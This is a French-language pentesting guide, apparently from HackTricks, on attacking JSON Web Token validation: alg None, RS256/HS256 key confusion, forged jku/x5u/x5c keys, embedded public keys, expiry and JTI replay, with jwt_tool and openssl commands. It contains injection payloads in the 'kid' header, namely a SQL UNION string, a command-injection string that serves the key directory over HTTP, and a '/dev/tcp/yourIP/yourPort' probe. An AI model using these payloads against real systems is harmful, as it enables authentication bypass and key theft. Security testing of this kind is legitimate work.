# Vuln√©rabilit√©s JWT (Json Web Tokens)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Astuce pour les primes de bug** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de **prime de bug cr√©√©e par des pirates, pour des pirates** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

**Une partie de cet article a √©t√© tir√©e de :** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Auteur de l'outil g√©nial pour pentester les JWT** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Gains rapides**

Ex√©cutez [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) en mode `All Tests!` et attendez les lignes vertes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Si vous avez de la chance, l'outil trouvera des cas o√π l'application web v√©rifie incorrectement le JWT :

![](<../.gitbook/assets/image (435).png>)

Ensuite, vous pouvez rechercher la requ√™te dans votre proxy ou extraire le JWT utilis√© pour cette requ√™te en utilisant l'outil jwt\_ :
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Manipuler les donn√©es sans rien modifier

Vous pouvez simplement manipuler les donn√©es en laissant la signature telle quelle et v√©rifier si le serveur v√©rifie la signature. Essayez de changer votre nom d'utilisateur en "admin", par exemple.

#### **La signature est-elle v√©rifi√©e ?**

- Si un message d'erreur appara√Æt, la signature est v√©rifi√©e - lisez les informations d'erreur d√©taill√©es qui pourraient divulguer des informations sensibles.
- Si la page renvoy√©e est diff√©rente, la signature est v√©rifi√©e.
- Si la page est la m√™me, alors la signature n'est pas v√©rifi√©e - il est temps de commencer √† manipuler les revendications de la charge utile pour voir ce que vous pouvez faire !

### Origine

V√©rifiez d'o√π provient le jeton dans l'historique des requ√™tes de votre proxy. Il devrait √™tre cr√©√© sur le serveur, pas sur le client.

- S'il a √©t√© vu pour la premi√®re fois en provenance du c√¥t√© client, alors la **cl√©** est accessible au code c√¥t√© client - recherchez-la !
- S'il a √©t√© vu pour la premi√®re fois en provenance du serveur, alors tout va bien.

### Dur√©e

V√©rifiez si le jeton dure plus de 24 heures... peut-√™tre qu'il n'expire jamais. S'il y a un champ "exp", v√©rifiez si le serveur le g√®re correctement.

### Brute-force du secret HMAC

[**Voir cette page.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modifier l'algorithme en None (CVE-2015-9235)

D√©finissez l'algorithme utilis√© comme "None" et supprimez la partie de la signature.

Utilisez l'extension Burp appel√©e "JSON Web Token" pour tester cette vuln√©rabilit√© et modifier diff√©rentes valeurs √† l'int√©rieur du JWT (envoyez la requ√™te √† Repeater et dans l'onglet "JSON Web Token", vous pouvez modifier les valeurs du jeton. Vous pouvez √©galement choisir de mettre la valeur du champ "Alg" √† "None").

### Changer l'algorithme RS256(asym√©trique) en HS256(sym√©trique) (CVE-2016-5431/CVE-2016-10555)

L'algorithme HS256 utilise la cl√© secr√®te pour signer et v√©rifier chaque message.\
L'algorithme RS256 utilise la cl√© priv√©e pour signer le message et utilise la cl√© publique pour l'authentification.

Si vous changez l'algorithme de RS256 √† HS256, le code c√¥t√© serveur utilise la cl√© publique comme cl√© secr√®te, puis utilise l'algorithme HS256 pour v√©rifier la signature.

Ensuite, en utilisant la cl√© publique et en changeant RS256 en HS256, nous pourrions cr√©er une signature valide. Vous pouvez r√©cup√©rer le certificat du serveur web en ex√©cutant ceci :
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nouvelle cl√© publique dans l'en-t√™te

Un attaquant int√®gre une nouvelle cl√© dans l'en-t√™te du jeton et le serveur utilise cette nouvelle cl√© pour v√©rifier la signature (CVE-2018-0114).

Cela peut √™tre fait avec l'extension "JSON Web Tokens" de Burp.\
(Envoyez la requ√™te √† Repeater, s√©lectionnez "CVE-2018-0114" dans l'onglet JSON Web Token et envoyez la requ√™te).

### Spoofing JWKS

Si le jeton utilise une revendication d'en-t√™te "jku", v√©rifiez l'URL fournie. Cela devrait pointer vers une URL contenant le fichier JWKS qui contient la cl√© publique pour v√©rifier le jeton. Modifiez le jeton pour pointer la valeur jku vers un service Web o√π vous pouvez surveiller le trafic.

Si vous obtenez une interaction HTTP, vous savez maintenant que le serveur essaie de charger des cl√©s √† partir de l'URL que vous fournissez. _Utilisez l'option -S de jwt\_tool avec l'argument -u_ [_http://example.com_](http://example.com) _pour g√©n√©rer une nouvelle paire de cl√©s, injectez votre URL fournie, g√©n√©rez un JWKS contenant la cl√© publique et signez le jeton avec la cl√© priv√©e._

### Probl√®mes de "kid"

`kid` est une revendication d'en-t√™te facultative qui contient un identifiant de cl√©, particuli√®rement utile lorsque vous avez plusieurs cl√©s pour signer les jetons et que vous devez trouver la bonne pour v√©rifier la signature.

#### Probl√®mes de "kid" - r√©v√©ler la cl√©

Si la revendication "kid" est utilis√©e dans l'en-t√™te, v√©rifiez le r√©pertoire Web pour ce fichier ou une variation de celui-ci. Par exemple, si `"kid":"key/12345"`, recherchez _/key/12345_ et _/key/12345.pem_ √† la racine du site Web.

#### Probl√®mes de "kid" - travers√©e de chemin

Si la revendication "kid" est utilis√©e dans l'en-t√™te, v√©rifiez si vous pouvez utiliser un fichier diff√©rent dans le syst√®me de fichiers. Choisissez un fichier dont vous pourriez pr√©dire le contenu, ou essayez peut-√™tre `"kid":"/dev/tcp/yourIP/yourPort"` pour tester la connectivit√©, ou m√™me quelques charges **SSRF**...\
_Utilisez l'option -T de jwt\_tool pour alt√©rer le JWT et changer la valeur de la revendication kid, puis choisissez de conserver la signature d'origine._
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
En utilisant des fichiers √† l'int√©rieur de l'h√¥te avec un contenu connu, vous pouvez √©galement falsifier un JWT valide. Par exemple, dans les syst√®mes Linux, le fichier `/proc/sys/kernel/randomize_va_space` a la valeur d√©finie sur **2**. Ainsi, en mettant ce **chemin** dans le param√®tre "**kid**" et en utilisant "**2**" comme **mot de passe sym√©trique** pour g√©n√©rer le JWT, vous devriez pouvoir g√©n√©rer un nouveau JWT valide.

#### Probl√®mes avec "kid" - Injection SQL

Dans un sc√©nario o√π le contenu de "kid" est utilis√© pour r√©cup√©rer le mot de passe de la base de donn√©es, vous pouvez modifier la charge utile √† l'int√©rieur du param√®tre "kid" en: `non-existent-index' UNION SELECT 'ATTACKER';-- -` puis signer le JWT avec la cl√© secr√®te `ATTACKER`.

#### Probl√®mes avec "kid" - Injection OS

Dans un sc√©nario o√π le param√®tre "kid" contient un chemin vers le fichier avec la cl√© et que ce chemin est utilis√© **dans une commande ex√©cut√©e**, vous pourriez √™tre en mesure d'obtenir une RCE et d'exposer la cl√© priv√©e avec une charge utile comme celle-ci: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### Attaques diverses

Les faiblesses suivantes sont connues et doivent √™tre test√©es.

**Attaques de relais entre services**

Certaines applications web utilisent un JWT "service" de confiance pour g√©n√©rer et g√©rer les jetons pour elles. Dans le pass√©, il est arriv√© que le jeton g√©n√©r√© pour l'un des clients du service JWT puisse √™tre accept√© par un autre client du service JWT.\
Si vous observez le JWT √©mis ou renouvel√© via un service tiers, il vaut la peine de v√©rifier si vous pouvez vous inscrire sur un autre client de ce service avec le m√™me nom d'utilisateur/adresse e-mail. Si c'est le cas, essayez de prendre ce jeton et de le rejouer dans une requ√™te vers votre cible. Est-il accept√© ?

* Si votre jeton est accept√©, vous pourriez avoir un probl√®me critique vous permettant de falsifier le compte de n'importe quel utilisateur. CEPENDANT, veuillez noter que si vous vous inscrivez sur une application tierce, vous devrez peut-√™tre demander l'autorisation d'effectuer des tests plus larges au cas o√π cela entrerait dans une zone grise l√©gale !

**Est-ce que "exp" est v√©rifi√© ?**

La revendication de charge utile "exp" est utilis√©e pour v√©rifier l'expiration d'un jeton. Comme les JWT sont souvent utilis√©s en l'absence d'informations de session, ils doivent √™tre manipul√©s avec pr√©caution - dans de nombreux cas, la capture et la relecture du JWT de quelqu'un d'autre vous permettront de vous faire passer pour cet utilisateur.\
Une att√©nuation contre les attaques de relecture de JWT (conseill√©e par le JWT RFC) consiste √† utiliser la revendication "exp" pour d√©finir une heure d'expiration pour le jeton. Il est √©galement important de mettre en place les v√©rifications appropri√©es dans l'application pour s'assurer que cette valeur est trait√©e et que le jeton est rejet√© s'il est expir√©. Si le jeton contient une revendication "exp" et que les limites de temps de test le permettent, essayez de stocker le jeton et de le rejouer apr√®s que le d√©lai d'expiration soit pass√©. _Utilisez l'option -R de jwt\_tool pour lire le contenu du jeton, ce qui inclut l'analyse des horodatages et la v√©rification de l'expiration (horodatage en UTC)_

* Si le jeton est toujours valid√© dans l'application, cela peut constituer un risque de s√©curit√© car le jeton peut NE JAMAIS expirer.

### x5u et jku

#### jku

jku signifie **URL de jeu de cl√©s JWK**.\
Si le jeton utilise une revendication "**jku**" dans l'en-t√™te, **v√©rifiez l'URL fournie**. Cela devrait pointer vers une URL contenant le fichier JWKS qui contient la cl√© publique pour v√©rifier le jeton. Modifiez le jeton pour pointer la valeur jku vers un service web pour lequel vous pouvez surveiller le trafic.

Tout d'abord, vous devez cr√©er un nouveau certificat avec de nouvelles cl√©s priv√©es et publiques.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Ensuite, vous pouvez utiliser par exemple [**jwt.io**](https://jwt.io) pour cr√©er le nouveau JWT avec les **cl√©s publiques et priv√©es cr√©√©es et en pointant le param√®tre jku vers le certificat cr√©√©.** Pour cr√©er un certificat jku valide, vous pouvez t√©l√©charger l'original et modifier les param√®tres n√©cessaires.

Vous pouvez obtenir les param√®tres "e" et "n" √† partir d'un certificat public en utilisant :
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

URL X.509. Un URI pointant vers un ensemble de certificats publics X.509 (un standard de format de certificat) encod√©s au format PEM. Le premier certificat de l'ensemble doit √™tre celui utilis√© pour signer ce JWT. Les certificats suivants signent chacun le pr√©c√©dent, compl√©tant ainsi la cha√Æne de certificats. X.509 est d√©fini dans la RFC 52807. La s√©curit√© du transport est n√©cessaire pour transf√©rer les certificats.

Essayez de **modifier cet en-t√™te pour qu'il pointe vers une URL sous votre contr√¥le** et v√©rifiez si une requ√™te est re√ßue. Dans ce cas, vous **pourriez alt√©rer le JWT**.

Pour falsifier un nouveau jeton en utilisant un certificat contr√¥l√© par vous, vous devez cr√©er le certificat et extraire les cl√©s publique et priv√©e :
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Ensuite, vous pouvez utiliser par exemple [**jwt.io**](https://jwt.io) pour cr√©er le nouveau JWT avec les **cl√©s publiques et priv√©es cr√©√©es et en pointant le param√®tre x5u vers le certificat .crt cr√©√©**.

![](<../.gitbook/assets/image (439).png>)

Vous pouvez √©galement exploiter ces deux vuln√©rabilit√©s **pour les SSRF**.

#### x5c

Ce param√®tre peut contenir le **certificat en base64** :

![](<../.gitbook/assets/image (440).png>)

Si l'attaquant **g√©n√®re un certificat auto-sign√©** et cr√©e un jeton falsifi√© en utilisant la cl√© priv√©e correspondante, puis remplace la valeur du param√®tre "x5c" par le certificat nouvellement g√©n√©r√© et modifie les autres param√®tres, √† savoir n, e et x5t, alors essentiellement le jeton falsifi√© serait accept√© par le serveur.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Cl√© publique int√©gr√©e (CVE-2018-0114)

Si le JWT a int√©gr√© une cl√© publique comme dans le sc√©nario suivant:

![](<../.gitbook/assets/image (438).png>)

En utilisant le script nodejs suivant, il est possible de g√©n√©rer une cl√© publique √† partir de ces donn√©es:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Il est possible de g√©n√©rer une nouvelle cl√© priv√©e/publique, d'incorporer la nouvelle cl√© publique dans le jeton et de l'utiliser pour g√©n√©rer une nouvelle signature :
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Vous pouvez obtenir les valeurs "n" et "e" en utilisant ce script nodejs :

```javascript
const jwt = require('jsonwebtoken');

const token = 'YOUR_JWT_TOKEN_HERE';

const decodedToken = jwt.decode(token, { complete: true });

const n = decodedToken.header.n;
const e = decodedToken.header.e;

console.log('n:', n);
console.log('e:', e);
```

Assurez-vous de remplacer "YOUR_JWT_TOKEN_HERE" par votre propre jeton JWT.
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
En utilisant la cl√© publique et priv√©e ainsi que les nouvelles valeurs "n" et "e", vous pouvez utiliser [jwt.io](https://jwt.io) pour cr√©er un nouveau JWT valide avec n'importe quelle information.

### JTI (JWT ID)

La revendication JTI (JWT ID) fournit un identifiant unique pour un jeton JWT. Il peut √™tre utilis√© pour emp√™cher la relecture du jeton.\
Cependant, imaginez une situation o√π la longueur maximale de l'ID est de 4 (0001-9999). Les requ√™tes 0001 et 10001 vont utiliser le m√™me ID. Donc, si le backend incr√©mente l'ID √† chaque requ√™te, vous pourriez abuser de cela pour **rejouer une requ√™te** (en ayant besoin d'envoyer 10000 requ√™tes entre chaque rejouement r√©ussi).

### Revendications enregistr√©es JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Outils

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce pour les primes de bugs** : **inscrivez-vous** √† **Intigriti**, une plateforme premium de **primes de bugs cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
